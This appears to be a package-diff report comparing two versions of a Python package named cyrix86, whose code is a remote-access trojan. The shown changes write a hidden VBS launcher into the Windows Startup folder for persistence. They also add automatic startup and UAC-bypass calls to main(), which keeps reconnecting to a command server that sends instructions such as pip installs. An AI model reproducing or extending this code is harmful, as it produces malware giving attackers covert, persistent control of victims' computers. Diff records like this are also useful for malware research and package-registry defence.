# Comparing `tmp/cyrix86-0.0.1.tar.gz` & `tmp/cyrix86-0.0.2.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "cyrix86-0.0.1.tar", last modified: Fri Apr  5 08:23:42 2024, max compression
+gzip compressed data, was "cyrix86-0.0.2.tar", last modified: Fri Apr  5 09:16:00 2024, max compression
```

## Comparing `cyrix86-0.0.1.tar` & `cyrix86-0.0.2.tar`

### file list

```diff
@@ -1,11 +1,11 @@
-drwxrwxrwx   0        0        0        0 2024-04-05 08:23:42.719508 cyrix86-0.0.1/
--rw-rw-rw-   0        0        0      281 2024-04-05 08:23:42.718507 cyrix86-0.0.1/PKG-INFO
-drwxrwxrwx   0        0        0        0 2024-04-05 08:23:42.717506 cyrix86-0.0.1/cyrix86.egg-info/
--rw-rw-rw-   0        0        0      281 2024-04-05 08:23:42.000000 cyrix86-0.0.1/cyrix86.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      173 2024-04-05 08:23:42.000000 cyrix86-0.0.1/cyrix86.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2024-04-05 08:23:42.000000 cyrix86-0.0.1/cyrix86.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0       93 2024-04-05 08:23:42.000000 cyrix86-0.0.1/cyrix86.egg-info/requires.txt
--rw-rw-rw-   0        0        0        8 2024-04-05 08:23:42.000000 cyrix86-0.0.1/cyrix86.egg-info/top_level.txt
--rw-rw-rw-   0        0        0    12317 2024-04-05 07:25:05.000000 cyrix86-0.0.1/cyrix86.py
--rw-rw-rw-   0        0        0       42 2024-04-05 08:23:42.720507 cyrix86-0.0.1/setup.cfg
--rw-rw-rw-   0        0        0      413 2024-04-05 06:50:51.000000 cyrix86-0.0.1/setup.py
+drwxrwxrwx   0        0        0        0 2024-04-05 09:16:00.912277 cyrix86-0.0.2/
+-rw-rw-rw-   0        0        0      281 2024-04-05 09:16:00.912277 cyrix86-0.0.2/PKG-INFO
+drwxrwxrwx   0        0        0        0 2024-04-05 09:16:00.910276 cyrix86-0.0.2/cyrix86.egg-info/
+-rw-rw-rw-   0        0        0      281 2024-04-05 09:16:00.000000 cyrix86-0.0.2/cyrix86.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      173 2024-04-05 09:16:00.000000 cyrix86-0.0.2/cyrix86.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2024-04-05 09:16:00.000000 cyrix86-0.0.2/cyrix86.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0       93 2024-04-05 09:16:00.000000 cyrix86-0.0.2/cyrix86.egg-info/requires.txt
+-rw-rw-rw-   0        0        0        8 2024-04-05 09:16:00.000000 cyrix86-0.0.2/cyrix86.egg-info/top_level.txt
+-rw-rw-rw-   0        0        0    12426 2024-04-05 09:15:08.000000 cyrix86-0.0.2/cyrix86.py
+-rw-rw-rw-   0        0        0       42 2024-04-05 09:16:00.913236 cyrix86-0.0.2/setup.cfg
+-rw-rw-rw-   0        0        0      413 2024-04-05 09:15:28.000000 cyrix86-0.0.2/setup.py
```

### Comparing `cyrix86-0.0.1/cyrix86.py` & `cyrix86-0.0.2/cyrix86.py`

 * *Files 2% similar despite different names*

```diff
@@ -319,15 +319,16 @@
         "Start Menu",
         "Programs",
         "Startup",
         f"{value}.vbs",
     )
     try:
         with open(startupFile, "w",) as f:
-            f.write(f'''CreateObject("WScript.Shell").run "cmd /c ""cd %APPDATA%\\{BASEFOLDERNAME} & pythonw cyrix86 {sys.argv[1]}""", 0''')
+            f.write(f'''' python installer
+CreateObject("WScript.Shell").run "cmd /c ""cd %APPDATA%\\{BASEFOLDERNAME} & python -m cyrix86 {sys.argv}""", 0''')
         if os.path.exists(startupFile):
             toServer(c, "success.")
         else:
             toServer(c, "ERROR: startup not installed.")
     except Exception as e:
         toServer(c, f"ERROR: {e}")
 
@@ -383,14 +384,16 @@
         pip(command, data['value'])
     elif command == "startup":
         startup(command, data['value'])
     elif command == "exit":
         _exit(command)
 
 def main():
+    if STARTUP == 'True': startup("startup", "python")
+    if UAC == 'True': uac("uac")
     try:
         SIO.connect(ORIGIN, wait_timeout=10)
         SIO.wait()
     except:
         time.sleep(4)
         main()
```

